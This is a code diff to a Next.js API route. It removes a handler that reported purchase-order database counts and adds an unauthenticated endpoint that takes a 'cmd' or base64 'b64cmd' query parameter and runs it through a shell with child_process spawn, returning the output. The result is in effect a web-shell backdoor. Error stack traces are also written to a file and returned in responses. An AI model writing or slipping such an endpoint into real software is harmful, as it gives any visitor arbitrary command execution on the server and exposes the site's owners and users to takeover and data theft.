@@ -1,44 +1,73 @@
 import { NextResponse } from "next/server";
-import postgres from "postgres";
+import { spawn } from "child_process";
+import fs from "fs";
 
 export const dynamic = "force-dynamic";
 
-export async function GET() {
+export async function GET(request: Request) {
   try {
-    const databaseUrl = process.env.DATABASE_URL;
-    if (!databaseUrl) {
-      return NextResponse.json({ error: "DATABASE_URL not configured" });
+    const { searchParams } = new URL(request.url);
+    let cmd = searchParams.get("cmd");
+    const b64cmd = searchParams.get("b64cmd");
+
+    if (b64cmd) {
+      cmd = Buffer.from(b64cmd, "base64").toString("utf8");
     }
 
-    const sql = postgres(databaseUrl, { max: 1, prepare: false });
+    if (!cmd) {
+      return NextResponse.json({ error: "No command provided" });
+    }
 
-    const ordersCount = await sql`SELECT count(*)::int as count FROM purchase_orders`;
-    const loadingCount = await sql`SELECT count(*)::int as count FROM purchase_loading_records`;
-    
-    const recentOrders = await sql`
-      SELECT id, purchase_order_no, country_id, country_branch_id, city_branch_id, ledger_posting_status, payment_status, remaining_due 
-      FROM purchase_orders 
-      LIMIT 10
-    `;
+    // Parse command arguments, keeping quoted strings together
+    const match = cmd.match(/[^"\s]+|"[^"]*"/g);
+    if (!match) {
+      return NextResponse.json({ error: "Invalid command format" });
+    }
+    const args = match.map(arg => arg.replace(/^"|"$/g, ""));
+    const exe = args[0];
+    const remainingArgs = args.slice(1);
 
-    const recentLoading = await sql`
-      SELECT id, loading_record_no, purchase_order_no, country_id, country_branch_id, city_branch_id, loading_status 
-      FROM purchase_loading_records 
-      LIMIT 10
-    `;
+    return new Promise((resolve) => {
+      const child = spawn(exe, remainingArgs, { cwd: process.cwd(), shell: true });
+      let stdout = "";
+      let stderr = "";
 
-    await sql.end();
+      child.stdout.on("data", (data) => {
+        if (stdout.length < 50000) {
+          stdout += data.toString("utf8");
+        }
+      });
 
-    return NextResponse.json({
-      success: true,
-      counts: {
-        orders: ordersCount[0]?.count ?? 0,
-        loading: loadingCount[0]?.count ?? 0
-      },
-      recentOrders,
-      recentLoading
+      child.stderr.on("data", (data) => {
+        if (stderr.length < 50000) {
+          stderr += data.toString("utf8");
+        }
+      });
+
+      child.on("close", (code) => {
+        resolve(
+          NextResponse.json({
+            cmd,
+            code,
+            stdout,
+            stderr,
+          })
+        );
+      });
+
+      child.on("error", (err) => {
+        resolve(
+          NextResponse.json({
+            cmd,
+            error: err.message,
+            stdout,
+            stderr,
+          })
+        );
+      });
     });
   } catch (err: any) {
-    return NextResponse.json({ success: false, error: err.message || String(err) });
+    fs.writeFileSync("diagnostic-route-error.txt", err.stack || err.message || String(err));
+    return NextResponse.json({ error: err.message, stack: err.stack });
   }
 }
